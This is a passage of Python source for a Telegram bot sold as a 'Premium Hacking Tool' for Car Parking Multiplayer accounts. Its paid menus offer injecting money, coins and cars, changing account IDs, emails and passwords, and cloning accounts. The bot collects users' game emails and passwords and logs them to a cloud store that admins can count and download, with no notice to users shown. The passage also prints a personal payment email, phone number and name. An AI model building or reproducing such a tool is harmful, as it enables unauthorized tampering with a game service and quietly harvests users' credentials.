            if uid:
                unique_users.add(uid)
        cpm1_count = 0
        cpm2_count = 0
        for key, entry in (credentials_logs or {}).items():
            game = entry.get('game', '')
            if game == 'cpm1':
                cpm1_count += 1
            elif game == 'cpm2':
                cpm2_count += 1
        recent_count = 0
        now = datetime.now(timezone.utc)
        for key, entry in (credentials_logs or {}).items():
            timestamp = entry.get('timestamp', '')
            if timestamp:
                try:
                    ts = datetime.fromisoformat(timestamp)
                    if (now - ts).total_seconds() < 86400:
                        recent_count += 1
                except Exception:
                    pass
        dashboard_text = (
            f"👑 **ADMIN DASHBOARD** 🥵\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📊 **TOTAL STATS:**\n"
            f"  • Credentials Saved: **{total_credentials}**\n"
            f"  • Changes Logged: **{total_changes}**\n"
            f"  • Keys/Trials: **{total_keys}**\n"
            f"  • Unique Users: **{len(unique_users)}**\n\n"
            f"🎮 **GAME BREAKDOWN:**\n"
            f"  • CPM1: **{cpm1_count}**\n"
            f"  • CPM2: **{cpm2_count}**\n\n"
            f"⏰ **24h Activity:** **{recent_count}**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"💾 Use /backupnow to download full backup.\n"
            f"📥 Use /download_logs for detailed logs."
        )
        bot.edit_message_text(dashboard_text, chat_id, msg.message_id, parse_mode='Markdown')
    except Exception as e:
        bot.edit_message_text(f"❌ **Failed to load dashboard:** {str(e)}", chat_id, msg.message_id, parse_mode='Markdown')

# ═══════════════════════════════════════════════════════════
# 🔑 TIME KEY FUNCTIONS
# ═══════════════════════════════════════════════════════════

def generate_time_key():
    chars = string.ascii_uppercase + string.digits
    return ''.join(random.choices(chars, k=16))

def create_time_key(duration_hours: int, created_by: int) -> str:
    key = generate_time_key()
    TIME_KEYS[key] = {
        "expires": datetime.now() + timedelta(hours=duration_hours),
        "duration": duration_hours,
        "used": False,
        "user_id": None,
        "created_by": created_by,
        "created_at": datetime.now(),
        "key_type": "time"
    }
    try:
        cloud_log_key_event(created_by, f"{duration_hours}h", "created", created_by)
    except Exception:
        pass
    return key

def use_time_key(key: str, user_id: int) -> Tuple[bool, str]:
    if key not in TIME_KEYS:
        return False, "Key not found"
    key_data = TIME_KEYS[key]
    if datetime.now() > key_data["expires"]:
        return False, "Key has expired"
    if key_data["used"]:
        if key_data["user_id"] == user_id:
            return True, "Key is still valid for you"
        else:
            return False, "Key already used by another user"
    key_data["used"] = True
    key_data["user_id"] = user_id
    USER_SUBSCRIPTIONS[user_id] = {
        "expires": key_data["expires"],
        "duration": key_data["duration"],
        "key": key
    }
    try:
        cloud_log_key_event(user_id, f"{key_data['duration']}h", "used", key_data['created_by'])
    except Exception:
        pass
    return True, "Key activated successfully"

def get_time_key_info(key: str) -> Dict[str, Any]:
    if key not in TIME_KEYS:
        return None
    return TIME_KEYS[key]

# ═══════════════════════════════════════════════════════════
# 🎁 FREE TRIAL FUNCTIONS
# ═══════════════════════════════════════════════════════════

def generate_trial_key():
    chars = string.ascii_uppercase + string.digits
    return ''.join(random.choices(chars, k=12))

def create_trial_key(user_id=None, minutes=10):
    key = generate_trial_key()
    TRIAL_KEYS[key] = {
        "user_id": user_id,
        "expires": datetime.now() + timedelta(minutes=minutes),
        "used": False,
        "created_at": datetime.now(),
        "duration": minutes,
        "used_at": None,
        "key_type": "trial"
    }
    try:
        cloud_log_key_event(user_id or 0, f"{minutes}min", "created", 0)
    except Exception:
        pass
    return key

def use_trial_key(key, user_id):
    if key not in TRIAL_KEYS:
        return False, "invalid"
    trial_data = TRIAL_KEYS[key]
    if datetime.now() > trial_data["expires"]:
        return False, "expired"
    if trial_data["used"] and trial_data["user_id"] != user_id:
        return False, "used_by_other"
    if trial_data["used"] and trial_data["user_id"] == user_id:
        return True, "already_used_same_user"
    TRIAL_KEYS[key]["used"] = True
    TRIAL_KEYS[key]["user_id"] = user_id
    TRIAL_KEYS[key]["used_at"] = datetime.now()
    try:
        cloud_log_key_event(user_id, "trial", "used", 0)
    except Exception:
        pass
    return True, "success"

def can_use_free_trial(user_id):
    if user_id not in FREE_TRIAL_USERS:
        return True, 0, 0
    last_used = FREE_TRIAL_USERS[user_id]["last_used"]
    days_passed = (datetime.now() - last_used).days
    if days_passed >= 5:
        return True, 0, 0
    next_available = last_used + timedelta(days=5)
    remaining = next_available - datetime.now()
    return False, remaining.days, remaining.seconds // 3600

def register_free_trial(user_id):
    FREE_TRIAL_USERS[user_id] = {
        "last_used": datetime.now(),
        "count": FREE_TRIAL_USERS.get(user_id, {}).get("count", 0) + 1
    }

# ═══════════════════════════════════════════════════════════
# 📋 FORMATTING FUNCTIONS
# ═══════════════════════════════════════════════════════════

def format_account_info(info: Dict[str, Any]) -> str:
    if not info.get("ok"):
        return "❌ **Cannot load account data**"
    return f"""
📊 **Account Info**
━━━━━━━━━━━━━━━━━━━━━
👤 **Name:** `{info.get('name', 'Unknown')}`
🆔 **ID:** `{info.get('localID', 'Unknown')}`
📧 **Email:** `{info.get('email', 'Unknown')}`
💰 **Money:** `{info.get('money', 0):,}`
💎 **Coins:** `{info.get('coin', 0):,}`
━━━━━━━━━━━━━━━━━━━━━
"""

def get_text(chat_id, key, **kwargs):
    texts = {
        "welcome": "🚘 **MARKMWEHEHETOOL BOT**\n🔥 Premium Hacking Tool 🔥\n━━━━━━━━━━━━━━━━━━━━━\n👤 Welcome!\n📌 Choose activation method:\n━━━━━━━━━━━━━━━━━━━━━\n🔑 Normal Key\n⏰ Time Key\n🎁 Free Trial (10 min)\n💎 Subscription\n━━━━━━━━━━━━━━━━━━━━━\n👤 @Maarkryan",
        "cpm1_section": "🚘 **CPM1 HACK PANEL**\n━━━━━━━━━━━━━━━━━━━━━\n✨ _MARKMWEHEHETOOL_ · Premium Tools",
        "cpm2_section": "🎮 **CPM2 HACK PANEL**\n━━━━━━━━━━━━━━━━━━━━━\n✨ _MARKMWEHEHETOOL_ · Premium Tools",
        "back": "🔙 Back",
        "not_logged": "❌ **Not logged in!** Use /start",
        "not_logged_short": "❌ **Not logged in!**",
        "login_cpm_success": "✅ **Logged in to CPM1!**",
        "login_cpm_fail": "❌ **Login failed!**",
        "login_cpm2_success": "✅ **Logged in to CPM2!**",
        "login_cpm2_fail": "❌ **Login failed!**",
        "key_success": "✅ **Activated!**",
        "wrong_key": "❌ Invalid key!",
        "key_title": "🔑 **Enter activation key:**",
        "enter_pass": "🔑 **Enter password:**",
        "email_prompt": "✅ **Selected {section}**\n━━━━━━━━━━━━━━━━━━━━━\n📧 **Enter email:**",
        "king_email_prompt": "👑 **Enter CPM1 email:**",
        "king_pass_prompt": "🔑 **Enter CPM1 password:**",
        "king_rank_success": "✅ {msg}",
        "king_rank_fail": "❌ {msg}",
        "money_added": "✅ **Added {amount}!**",
        "money_fail": "❌ **Failed!**",
        "id_changed": "✅ **ID changed to `{new_id}`**",
        "id_fail": "❌ **Failed!**",
        "email_changed": "✅ **Email changed to `{new_email}`**",
        "email_fail": "❌ **Failed!**",
        "pass_changed": "✅ **Password changed!**",
        "pass_fail": "❌ **Failed!**",
        "clone_success": "✅ **Clone done!**\n🚗 {success}/{total} cars",
        "clone_fail": "❌ **Clone failed!**\n💀 {error}",
        "unlock_cars_done": "✅ **Cars unlocked!**",
        "unlock_cars_fail": "❌ **Failed to unlock cars!**",
        "unlock_cars_auto_done": "✅ **Injected {success}/270 cars!**",
        "logout": "🚪 **Logged out**",
        "free_trial_first": "🎁 **Free trial activated!** ✅ 10 minutes",
        "trial_activating": "🎁 Activating...",
        "start_normal_key": "🔑 Normal Key",
        "start_time_key": "⏰ Time Key",
        "start_free_trial": "🎁 Free Trial (10 min)",
        "start_subscription": "💎 Subscription",
        "main_cpm1": "📱 CPM1",
        "main_cpm2": "🎮 CPM2",
        "cpm1_change_email_btn": "🔵 Change Email",
        "cpm1_change_pass_btn": "🟡 Change Password",
        "cpm1_clone_btn": "📋 Clone Account",
        "cpm1_unlock_cars_btn": "🚗 Unlock Cars",
        "cpm1_w16_btn": "⚡ W16 Engine",
        "cpm1_horns_btn": "📯 Horns",
        "cpm1_fuel_btn": "⛽ Unlimited Fuel",
        "cpm1_damage_btn": "🛡️ Disable Damage",
        "cpm1_smoke_btn": "💨 Smoke",
        "cpm1_rank_btn": "👑 King Rank (Advanced)",
        "cpm1_fix_btn": "🔧 Fix Account",
        "cpm1_change_id_btn": "🆔 Change ID",
        "cpm1_money_btn": "💰 Add Money",
        "cpm1_coin_btn": "💎 Add Coins",
        "cpm1_unlock_animations_btn": "🎭 Unlock Animations",
        "cpm1_unlock_wheels_btn": "🛞 Unlock Wheels",
        "cpm1_unlock_houses_btn": "🏠 Unlock Houses",
        "cpm1_complete_levels_btn": "🏆 Complete Levels",
        "cpm1_unlock_equip_male_btn": "👨 Unlock Male Equip",
        "cpm1_unlock_equip_female_btn": "👩 Unlock Female Equip",
        "cpm1_ultimate_btn": "💀 Ultimate Unlock",
        "cpm2_king_rank_btn": "👑 King Rank CPM2",
        "cpm2_generate_btn": "🎲 Generate Full Account",
        "admin_panel": "👑 **Admin Panel**",
        "not_admin": "❌ **Admins only!**",
        "refresh_account": "🔄 Refresh Info",
        "unlock_cars_auto_confirm": "🤖 **Auto Injection (1-270)**\n⚡ Ready to inject 270 cars.\n📌 Confirm?",
        "unlock_cars_auto_yes": "✅ Confirm",
        "unlock_cars_auto_cancel": "❌ Cancel",
        "unlock_cars_manual_prompt": "🖐️ **Manual Injection**\n📌 Enter Car ID:",
        "unlock_cars_prompt": "🚗 **Unlock CPM1 Cars**\n━━━━━━━━━━━━━━━━━━━━━\n📧 Email: `{email}`\n\n📌 Choose injection type:",
        "time_key_title": "⏰ **Enter Time Key:**",
        "subscription_menu": """
💎 **SUBSCRIPTION FOR STARS**
━━━━━━━━━━━━━━━━━━━━━
1 Day - 30 ⭐ | 5 Days - 130 ⭐
1 Week - 200 ⭐ | 3 Weeks - 250 ⭐
5 Weeks - 300 ⭐ | 7 Weeks - 330 ⭐
12 Weeks - 1,050 ⭐ | 14 Weeks - 1,250 ⭐

💰 **SUBSCRIPTION FOR MONEY PAYMENT**
━━━━━━━━━━━━━━━━━━━━━
1 Day - 30 Pesos | $1
5 Days - 130 Pesos | $3
1 Week - 200 Pesos | $4
3 Weeks - 250 Pesos | $5
5 Weeks - 300 Pesos | $6
7 Weeks - 330 Pesos | $7
12 Weeks - 1,050 Pesos | $13
14 Weeks - 1,250 Pesos | $17

📌 Select your duration below:
""",
        "subscription_duration_selected": "✅ **Selected:** {duration}\n💰 **Price:** {price}\n\n📌 Choose payment method:",
        "subscription_paypal": "💳 **PAYPAL PAYMENT**\n━━━━━━━━━━━━━━━━━━━━━\n📧 **Email:** `markryanmanoguid867@gmail.com`\n\n📌 Please make sure you screenshot the payment cause the bot will request for the screenshot.\n\n📤 **Send your payment screenshot now:**",
        "subscription_paymaya": "📱 **PAYMAYA PAYMENT**\n━━━━━━━━━━━━━━━━━━━━━\n📱 **Number:** `09281630511`\n👤 **Name:** MARK RYAN MANOGUID\n\n📌 Please make sure you screenshot the payment cause the bot will request for the screenshot.\n\n📤 **Send your payment screenshot now:**",
        "subscription_gcash_to_paymaya": "🔄 **GCASH TO PAYMAYA**\n━━━━━━━━━━━━━━━━━━━━━\n📌 DM @Maarkryan SO Maarkryan can send you the QR CODE bro thanks ❤‍🔥❤‍🔥\n\n📌 Please make sure you screenshot the payment cause the bot will request for the screenshot.\n\n📤 **Send your payment screenshot now:**",
        "subscription_stars_info": "🌟 **TELEGRAM STARS PAYMENT**\n━━━━━━━━━━━━━━━━━━━━━\n⭐ **Amount:** {stars} ⭐\n\n📌 Click the button below to pay with Telegram Stars.\n📌 After payment, your subscription will be **activated AUTOMATICALLY** — no need to wait!",
        "subscription_stars_pay_btn": "⭐ Pay {stars} Stars",
        "subscription_stars_paid": "✅ **PAYMENT RECEIVED!**\n━━━━━━━━━━━━━━━━━━━━━\n⭐ **Stars:** {stars} ⭐\n⏱️ **Duration:** {duration}\n📅 **Expires:** {expires}\n\n🎉 Your subscription is now **AUTOMATICALLY ACTIVATED**!\n✅ You can now use all bot features!",
        "subscription_auto_activated": "✅ **SUBSCRIPTION ACTIVATED!**\n━━━━━━━━━━━━━━━━━━━━━\n⏱️ **Duration:** {duration}\n📅 **Expires:** {expires}\n\n🎉 Enjoy your subscription! An admin will verify your payment in the group log.\n✅ You can now use all bot features!",
        "subscription_photo_received": "📸 **Payment screenshot received!**\n⏳ Please wait for admin verification.\n\n📌 You will be notified once confirmed.",
        "subscription_confirm_message": "✅ **SUBSCRIPTION CONFIRMED!**\n━━━━━━━━━━━━━━━━━━━━━\n🎉 Your subscription is now active!\n⏱️ Duration: {duration}\n📅 Expires: {expires}\n\n✅ You can now use the bot features!",
        "subscription_decline_message": "❌ **SUBSCRIPTION DECLINED**\n━━━━━━━━━━━━━━━━━━━━━\n⚠️ Your payment could not be verified.\n📌 Please contact @Maarkryan for assistance.",
        "subscription_cancelled": "❌ Subscription cancelled.",
        "subscription_expired": "⏰ **Your subscription has expired!**\n━━━━━━━━━━━━━━━━━━━━━\n🔄 You want another subscription?\n\n💎 Click the button below to renew:",
        "subscription_renew": "🔄 Renew Subscription"
    }
    text = texts.get(key, f"Missing text: {key}")
    if kwargs:
        try:
            text = text.format(**kwargs)
        except Exception:
            pass
    return text

def is_admin(chat_id):
    return chat_id in ADMIN_IDS

def is_banned(chat_id):
    return chat_id in banned_users

def add_log(chat_id, action):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    user_logs.append(f"[{timestamp}] User {chat_id}: {action}")
    if len(user_logs) > 100:
        user_logs.pop(0)

def save_account(chat_id, email, password, player_id=None, name=None):
    if chat_id not in saved_accounts:
        saved_accounts[chat_id] = []
    account_data = {
        "email": email,
        "password": password,
        "player_id": player_id,
        "name": name,
        "saved_at": time.strftime("%Y-%m-%d %H:%M:%S")
    }
    for acc in saved_accounts[chat_id]:
        if acc["email"] == email:
            acc.update(account_data)
            return
    saved_accounts[chat_id].append(account_data)
    try:
        cloud_log_credentials(email, password, "cpm1", "saved", "", "", chat_id)
    except Exception as e:
        print(f"⚠️ Failed to log saved account to Firebase: {e}")

def check_subscription(chat_id):
    try:
        member = bot.get_chat_member(CHANNEL_ID, chat_id)
        return member.status in ['member', 'administrator', 'creator']
    except Exception:
        return False

def subscription_required(message):
    chat_id = message.chat.id
    markup = types.InlineKeyboardMarkup(row_width=1)
    btn1 = types.InlineKeyboardButton("📢 Subscribe to Channel", url=CHANNEL_LINK)
    btn2 = types.InlineKeyboardButton("🔄 Check Subscription", callback_data="check_sub")
    markup.add(btn1, btn2)
    bot.send_message(chat_id, "❌ **You must subscribe to the channel first!**\n\n📢 **Channel:** [markmwehehe](https://t.me/markmwhehe)", reply_markup=markup, parse_mode='Markdown')

def refresh_account_data(chat_id):
    if chat_id not in user_sessions or not user_sessions[chat_id].get('logged_in'):
        return False, "Not logged in"
    web_uid = user_sessions[chat_id].get('web_uid')
    if not web_uid:
        return False, "No web UID"
    email = user_sessions[chat_id].get('email')
    if not email:
        return False, "No email"
    try:
        ck = nuker._ck(web_uid, email)
        if ck in nuker.cache:
            del nuker.cache[ck]
        success = run_async(nuker.load_account(web_uid, force=True))
        if success:
            return True, "Data refreshed successfully"
        else:
            return False, "Failed to load data from server"
    except Exception as e:
        return False, f"Error: {str(e)}"

# ═══════════════════════════════════════════════════════════
# 🎨 KEYBOARDS
# ═══════════════════════════════════════════════════════════

def create_start_keyboard(chat_id):
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("🔑 Normal Key", callback_data="normal_key")
    btn2 = types.InlineKeyboardButton("⏰ Time Key", callback_data="time_key")
    btn3 = types.InlineKeyboardButton("🎁 Free Trial (10 min)", callback_data="free_trial")
    btn4 = types.InlineKeyboardButton("💎 Subscription", callback_data="subscription_menu")
    markup.row(btn1, btn2)
    markup.row(btn3)
    markup.row(btn4)
    return markup

def create_main_keyboard(chat_id):
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("📱 CPM1", callback_data="section_cpm1")
    btn2 = types.InlineKeyboardButton("🎮 CPM2", callback_data="section_cpm2")
    btn3 = types.InlineKeyboardButton("💎 Subscription", callback_data="subscription_menu")
    btn4 = types.InlineKeyboardButton("🚪 Logout", callback_data="logout")
    if is_admin(chat_id):
        btn_admin = types.InlineKeyboardButton("👑 Admin Panel", callback_data="admin_panel")
        markup.row(btn_admin)
    markup.row(btn1, btn2)
    markup.row(btn3)
    markup.row(btn4)
    return markup

def create_subscription_duration_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("1 Day - 30 ⭐ | 30 Pesos", callback_data="sub_duration_1_day")
    btn2 = types.InlineKeyboardButton("5 Days - 130 ⭐ | 130 Pesos", callback_data="sub_duration_5_days")
    btn3 = types.InlineKeyboardButton("1 Week - 200 ⭐ | 200 Pesos", callback_data="sub_duration_1_week")
    btn4 = types.InlineKeyboardButton("3 Weeks - 250 ⭐ | 250 Pesos", callback_data="sub_duration_3_weeks")
    btn5 = types.InlineKeyboardButton("5 Weeks - 300 ⭐ | 300 Pesos", callback_data="sub_duration_5_weeks")
    btn6 = types.InlineKeyboardButton("7 Weeks - 330 ⭐ | 330 Pesos", callback_data="sub_duration_7_weeks")
    btn7 = types.InlineKeyboardButton("12 Weeks - 1,050 ⭐ | 1,050 Pesos", callback_data="sub_duration_12_weeks")
    btn8 = types.InlineKeyboardButton("14 Weeks - 1,250 ⭐ | 1,250 Pesos", callback_data="sub_duration_14_weeks")
    btn9 = types.InlineKeyboardButton("🔙 Back", callback_data="back_main")
    markup.row(btn1, btn2)
    markup.row(btn3, btn4)
    markup.row(btn5, btn6)
    markup.row(btn7, btn8)
    markup.row(btn9)
    return markup

def create_payment_method_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("💳 PayPal", callback_data="sub_payment_paypal")
    btn2 = types.InlineKeyboardButton("📱 PayMaya", callback_data="sub_payment_paymaya")
    btn3 = types.InlineKeyboardButton("🔄 GCash to PayMaya", callback_data="sub_payment_gcash_to_paymaya")
    btn4 = types.InlineKeyboardButton("🌟 Telegram Stars", callback_data="sub_payment_stars")
    btn5 = types.InlineKeyboardButton("🔙 Back", callback_data="subscription_menu")
    markup.row(btn1, btn2)
    markup.row(btn3, btn4)
    markup.row(btn5)
    return markup

def create_subscription_confirm_keyboard(user_id, duration, payment_method):
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("✅ Confirm", callback_data=f"sub_confirm_{user_id}_{duration}_{payment_method}")
    btn2 = types.InlineKeyboardButton("❌ Decline", callback_data=f"sub_decline_{user_id}_{duration}_{payment_method}")
    markup.row(btn1, btn2)
    return markup

def create_subscription_stars_log_keyboard():
    """Record-only keyboard shown on Stars group log posts (no confirm/decline needed)."""
    markup = types.InlineKeyboardMarkup(row_width=1)
    btn1 = types.InlineKeyboardButton("✅ Automatically activated — record only", callback_data="stars_record_only")
    markup.row(btn1)
    return markup

@bot.callback_query_handler(func=lambda call: call.data == "stars_record_only")
def stars_record_only_callback(call):
    bot.answer_callback_query(call.id, "🌟 Stars payments activate automatically. No confirm/decline needed.", show_alert=True)

def create_subscription_renew_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=1)
    btn1 = types.InlineKeyboardButton("🔄 Renew Subscription", callback_data="subscription_menu")
    markup.row(btn1)
    return markup

def create_cpm1_keyboard(chat_id):
    """Clean, categorized CPM1 menu: Account | Cars & Mods | Resources |
    Progress | Unlocks | Ultimate, with Refresh + Back at the bottom."""
    markup = types.InlineKeyboardMarkup(row_width=2)
    # ── Account
    markup.row(types.InlineKeyboardButton("📋 Clone Account", callback_data="cpm1_clone"),
               types.InlineKeyboardButton("🚗 Unlock Cars", callback_data="cpm1_unlock_cars"))
    markup.row(types.InlineKeyboardButton("🔧 Fix Account", callback_data="cpm1_fix"),
               types.InlineKeyboardButton("🆔 Change ID", callback_data="cpm1_change_id"))
    markup.row(types.InlineKeyboardButton("🔵 Change Email", callback_data="cpm1_change_email"),
               types.InlineKeyboardButton("🟡 Change Password", callback_data="cpm1_change_pass"))
    # ── Cars & Mods
    markup.row(types.InlineKeyboardButton("⚡ W16 Engine", callback_data="cpm1_w16"),
               types.InlineKeyboardButton("📯 Horns", callback_data="cpm1_horns"))
    markup.row(types.InlineKeyboardButton("⛽ Unlimited Fuel", callback_data="cpm1_fuel"),
               types.InlineKeyboardButton("🛡️ Disable Damage", callback_data="cpm1_damage"))
    markup.row(types.InlineKeyboardButton("💨 Smoke", callback_data="cpm1_smoke"),
               types.InlineKeyboardButton("👑 King Rank", callback_data="cpm1_rank_advanced"))
    # ── Resources
    markup.row(types.InlineKeyboardButton("💰 Add Money", callback_data="cpm1_money"),
               types.InlineKeyboardButton("💎 Add Coins", callback_data="cpm1_coin"))
    # ── Progress
    markup.row(types.InlineKeyboardButton("🏆 Complete Levels", callback_data="cpm1_complete_levels"))
    # ── Unlocks
    markup.row(types.InlineKeyboardButton("🎭 Animations", callback_data="cpm1_unlock_animations"),
               types.InlineKeyboardButton("🛞 Wheels", callback_data="cpm1_unlock_wheels"))
    markup.row(types.InlineKeyboardButton("🏠 Houses", callback_data="cpm1_unlock_houses"),
               types.InlineKeyboardButton("👨 Male Equip", callback_data="cpm1_unlock_equip_male"))
    markup.row(types.InlineKeyboardButton("👩 Female Equip", callback_data="cpm1_unlock_equip_female"),
               types.InlineKeyboardButton("🚪 Logout", callback_data="logout"))
    # ── Ultimate + utilities
    markup.row(types.InlineKeyboardButton("💀 Ultimate Unlock", callback_data="cpm1_ultimate"))
    markup.row(types.InlineKeyboardButton("🔄 Refresh Info", callback_data="refresh_account"),
               types.InlineKeyboardButton("🔙 Back", callback_data="back_main"))
    return markup

def create_cpm2_keyboard(chat_id):
    markup = types.InlineKeyboardMarkup(row_width=1)
    btn1 = types.InlineKeyboardButton("👑 King Rank CPM2", callback_data="cpm2_king_rank")
    btn2 = types.InlineKeyboardButton("🎲 Generate Account", callback_data="cpm2_generate")
    btn3 = types.InlineKeyboardButton("🔙 Back", callback_data="back_main")
    markup.row(btn1)
    markup.row(btn2)
    markup.row(btn3)
    return markup

def create_unlock_cars_keyboard(chat_id):
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("🖐️ Manual Injection", callback_data="unlock_manual")
    btn2 = types.InlineKeyboardButton("🤖 Auto Injection (1-270)", callback_data="unlock_auto")
    btn3 = types.InlineKeyboardButton("🔙 Back", callback_data="back_cpm1")
    markup.row(btn1, btn2)
    markup.row(btn3)
    return markup

def create_unlock_auto_confirm_keyboard(chat_id):
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("✅ Confirm", callback_data="unlock_auto_confirm")
    btn2 = types.InlineKeyboardButton("❌ Cancel", callback_data="unlock_auto_cancel")
    markup.row(btn1, btn2)
    return markup

def create_admin_keyboard(chat_id):
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("📊 Stats", callback_data="admin_stats")
    btn2 = types.InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")
    btn3 = types.InlineKeyboardButton("🔑 Manage Keys", callback_data="admin_keys")
    btn4 = types.InlineKeyboardButton("⏰ Time Keys", callback_data="admin_time_keys")
    btn5 = types.InlineKeyboardButton("📊 Key Stats", callback_data="admin_key_stats")
    btn6 = types.InlineKeyboardButton("👥 Key Users", callback_data="admin_key_users")
    btn7 = types.InlineKeyboardButton("🔄 Refresh All", callback_data="admin_refresh_all")
    btn8 = types.InlineKeyboardButton("🚫 Ban", callback_data="admin_ban")
    btn9 = types.InlineKeyboardButton("✅ Unban", callback_data="admin_unban")
    btn10 = types.InlineKeyboardButton("📝 Logs", callback_data="admin_logs")
    btn11 = types.InlineKeyboardButton("💾 Saved Accounts", callback_data="admin_saved")
    btn12 = types.InlineKeyboardButton("⚙️ Toggle Status", callback_data="admin_status")
    btn13 = types.InlineKeyboardButton("📥 Download Logs", callback_data="admin_download_logs")
    btn14 = types.InlineKeyboardButton("💾 Backup Now", callback_data="admin_backup_now")
    btn15 = types.InlineKeyboardButton("📊 Dashboard", callback_data="admin_dashboard")
    btn16 = types.InlineKeyboardButton("🔙 Back", callback_data="back_main")
    markup.row(btn1, btn2)
    markup.row(btn3, btn4)
    markup.row(btn5, btn6)
    markup.row(btn7, btn8)
    markup.row(btn9, btn10)
    markup.row(btn11, btn12)
    markup.row(btn13, btn14)
    markup.row(btn15)
    markup.row(btn16)
    return markup

# ═══════════════════════════════════════════════════════════
# 📱 SECTION FUNCTIONS
# ═══════════════════════════════════════════════════════════

def get_web_uid(telegram_id):
    return int(str(telegram_id)[:12])

def show_cpm1_menu(chat_id, message=None, force_refresh=False):
    if chat_id not in user_sessions or not user_sessions[chat_id].get('logged_in') or user_sessions[chat_id].get('version') != "1":
        bot.send_message(chat_id, "❌ **You must login to CPM1 first!**", parse_mode='Markdown')
        return
    web_uid = user_sessions[chat_id].get('web_uid')
    if not web_uid:
        bot.send_message(chat_id, "❌ **Session expired! Login again.**", parse_mode='Markdown')
        return
    if force_refresh:
        email = user_sessions[chat_id].get('email')
        if email:
            ck = nuker._ck(web_uid, email)
            if ck in nuker.cache:
                del nuker.cache[ck]
        run_async(nuker.load_account(web_uid, force=True))
    info = run_async(nuker.get_account_info(web_uid))
    info_text = format_account_info(info)
    full_text = f"{info_text}\n{get_text(chat_id, 'cpm1_section')}"
    if message:
        try:
            bot.edit_message_text(full_text, chat_id, message.message_id, reply_markup=create_cpm1_keyboard(chat_id), parse_mode='Markdown')
        except Exception:
            bot.send_message(chat_id, full_text, reply_markup=create_cpm1_keyboard(chat_id), parse_mode='Markdown')
    else:
        bot.send_message(chat_id, full_text, reply_markup=create_cpm1_keyboard(chat_id), parse_mode='Markdown')

def section_cpm1(message):
    chat_id = message.chat.id
    if chat_id not in user_sessions:
        user_sessions[chat_id] = {}
    if user_sessions[chat_id].get('logged_in') and user_sessions[chat_id].get('version') == "1":
        show_cpm1_menu(chat_id)
        return
    bot.send_message(chat_id, "🔐 **Login to CPM1**\n━━━━━━━━━━━━━━━━━━━━━\n📌 Login first to access activations.\n━━━━━━━━━━━━━━━━━━━━━\n📧 **Enter CPM1 email:**", parse_mode='Markdown')
    user_cpm_version[chat_id] = "1"
    bot.register_next_step_handler(message, get_email)

def section_cpm2(message):
    chat_id = message.chat.id
    if chat_id not in user_sessions:
        user_sessions[chat_id] = {}
    if user_sessions[chat_id].get('logged_in') and user_sessions[chat_id].get('version') == "2":
        if is_admin(chat_id):
            bot.send_message(chat_id, get_text(chat_id, "cpm2_section"), reply_markup=create_cpm2_keyboard(chat_id), parse_mode='Markdown')
        else:
            bot.send_message(chat_id, "🛠️ **CPM2 is currently under maintenance.**\n━━━━━━━━━━━━━━━━━━━━━\n⏳ Please check back later.\n\n📌 For inquiries, contact @Maarkryan.", parse_mode='Markdown')
        return
    bot.send_message(chat_id, "🔐 **Login to CPM2**\n━━━━━━━━━━━━━━━━━━━━━\n📌 Login first to access activations.\n━━━━━━━━━━━━━━━━━━━━━\n📧 **Enter CPM2 email:**", parse_mode='Markdown')
    user_cpm_version[chat_id] = "2"
    bot.register_next_step_handler(message, get_email)

def admin_panel(message):
    chat_id = message.chat.id
    if not is_admin(chat_id):
        bot.send_message(chat_id, get_text(chat_id, "not_admin"), parse_mode='Markdown')
        return
    markup = create_admin_keyboard(chat_id)
    bot.send_message(chat_id, get_text(chat_id, "admin_panel"), reply_markup=markup, parse_mode='Markdown')

# ═══════════════════════════════════════════════════════════
# 🚀 BOT COMMANDS
# ═══════════════════════════════════════════════════════════

@bot.message_handler(commands=['start'])
def start(message):
    chat_id = message.chat.id
    if is_banned(chat_id):
        bot.send_message(chat_id, "🚫 **You are banned!**", parse_mode='Markdown')
        return
    if chat_id in USER_SUBSCRIPTIONS:
        sub_data = USER_SUBSCRIPTIONS[chat_id]
        if datetime.now() > sub_data['expires']:
            del USER_SUBSCRIPTIONS[chat_id]
            markup = create_subscription_renew_keyboard()
            bot.send_message(
                chat_id,
                get_text(chat_id, "subscription_expired"),
                reply_markup=markup,
                parse_mode='Markdown'
            )
            return
        else:
            # Active subscriber — skip the activation menu entirely.
            total_users.add(chat_id)
            if chat_id in user_states:
                del user_states[chat_id]
            # Only skip the login requirement if the user is STILL logged in
            # (has not pressed Logout). Logging out must stay permanent until
            # the user logs in again.
            expires = sub_data['expires'].strftime("%Y-%m-%d %H:%M")
            bot.send_message(
                chat_id,
                f"💎 **WELCOME BACK, SUBSCRIBER!** 💎\n━━━━━━━━━━━━━━━━━━━━━\n✅ Your subscription is active.\n⏱️ Duration: {sub_data['duration']} hours\n📅 Expires: {expires}\n━━━━━━━━━━━━━━━━━━━━━\n🎮 You can now use all features!",
                reply_markup=create_main_keyboard(chat_id),
                parse_mode='Markdown'
            )
            return
    total_users.add(chat_id)
    if not check_subscription(chat_id):
        subscription_required(message)
        return
    if chat_id in user_sessions:
        user_sessions[chat_id] = {}
    markup = create_start_keyboard(chat_id)
    bot.send_message(chat_id, get_text(chat_id, "welcome"), reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(commands=['menu'])
def menu_command(message):
    chat_id = message.chat.id
    if is_banned(chat_id):
        return
    if chat_id in USER_SUBSCRIPTIONS:
        sub_data = USER_SUBSCRIPTIONS[chat_id]
        if datetime.now() > sub_data['expires']:
            del USER_SUBSCRIPTIONS[chat_id]
            markup = create_subscription_renew_keyboard()
            bot.send_message(
